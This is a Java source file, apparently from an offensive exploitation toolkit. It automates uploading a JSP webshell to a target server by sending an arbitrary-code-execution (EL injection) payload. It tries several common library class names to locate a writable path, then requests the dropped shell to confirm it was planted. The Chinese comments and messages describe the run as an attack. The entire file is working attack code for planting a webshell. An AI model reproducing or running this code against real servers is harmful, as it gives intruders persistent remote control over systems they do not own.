package com.droplab.Controller.elShell.Service;

import com.droplab.Utils.Factory.CodeFactory;
import com.droplab.Controller.elShell.Common.PayloadFactory;
import com.droplab.Utils.CommonUtils;
import com.droplab.Utils.HttpUtils;
import com.droplab.Utils.InfoUtils;
import com.droplab.Utils.ResponseUtils;
import com.droplab.service.BugService;
import org.jsoup.Connection;

import java.io.File;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Iterator;

/**
 * 基于自动寻址的任意文件上传
 */
public class elShellUploadShell extends BugService {
    private ArrayList<String> classNameList=new ArrayList(){{ //基于自动寻址需要的全类名，放一些非常可能出现的包类名
       add("org.apache.commons.beanutils.BeanUtils");
       add("org.apache.log4j.spi.LoggerFactory");
       add("com.alibaba.fastjson.JSON");
       add("org.apache.commons.collections.CollectionUtils");
    }};

    @Override
    public Object run(String type) {
        try {
            if (params.size() > 0) {
                String url = "";
                String rooturl="";
                String filepath = null;
                String classname = "";
                String filename =null;
                Iterator<String> iterator = params.keySet().iterator();
                while (iterator.hasNext()) {
                    String key = iterator.next();
                    if (key.equals("url")) {
                        url = params.get(key);
                    } else if (key.equals("filepath")) {
                        filepath = params.get(key);
                    } else if (key.equals("classname")) {
                        classname = params.get(key);
                    }else if (key.equals("filename")) {
                        filename = params.get(key);
                    } else if (key.equals("rooturl")) {
                        rooturl = params.get(key);
                    }
                }
                if(!url.equals("") && !url.isEmpty()){
                    if((!classname.equals("") && !classname.isEmpty())&&!classNameList.contains(classname)){
                        classNameList.add(classname);
                    }
                    for (String cname:classNameList) {
                        String uploadShell = CodeFactory.instance().getUploadShell("",cname, filename, new File(filepath));
                        String anyCodeExecute = PayloadFactory.instance().getAnyCodeExecute();
                        String format = String.format(anyCodeExecute, uploadShell);

                        HashMap<String, String> headers = new HashMap<>();
                        CommonUtils.hashMapClone(InfoUtils.headers, headers);
                        headers.put("Referer", url);
                        HashMap paramMap = new HashMap();
                        paramMap.put("Code", format);
                        Connection.Response post = HttpUtils.post(headers,url,paramMap );
                        String shell=rooturl+"/"+filename+".jsp";
                        Thread.sleep(1000*3); //避免访问太快导致误报
                        Connection.Response response = HttpUtils.post(headers,shell,null);
                        String content = new String(response.bodyAsBytes());
                        if(content.contains("this is testing <||>")){
                            return response;
                        }
                    }
                    ResponseUtils responseUtils = new ResponseUtils();
                    responseUtils.setMessage("攻击结束，自动探测webshell失败，可以手动测试webshell是否写入成功。");
                    return responseUtils;
                }
            }
        }catch (Exception e){
            e.printStackTrace();
        }
        return null;
    }
}
